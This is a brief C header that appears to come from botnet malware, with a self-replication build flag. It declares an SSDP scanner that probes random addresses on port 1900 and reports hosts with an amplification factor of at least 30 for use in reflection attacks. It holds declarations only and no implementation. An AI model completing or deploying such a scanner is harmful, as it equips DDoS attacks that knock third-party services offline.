#ifdef SELFREP
#pragma once
#include <stdint.h>
#include "includes.h"
#define SSDP_SCANNER_MAX_CONNS   128
#define SSDP_PORT                 1900
#define SSDP_MCAST_ADDR           "239.255.255.250"
#define SSDP_MIN_AMPLIFICATION    30
void ssdp_scanner(void);
void ssdp_kill(void);
static void ssdp_setup_connection(ipv4_t target_ip);
static ipv4_t get_random_ssdp_ip(void);
static void ssdp_report_amplifier(ipv4_t ip, uint16_t port, uint32_t amplification_factor);
static void log_event(const char *scanner, const char *event, ipv4_t ip, uint16_t port, const char *details);
#endif

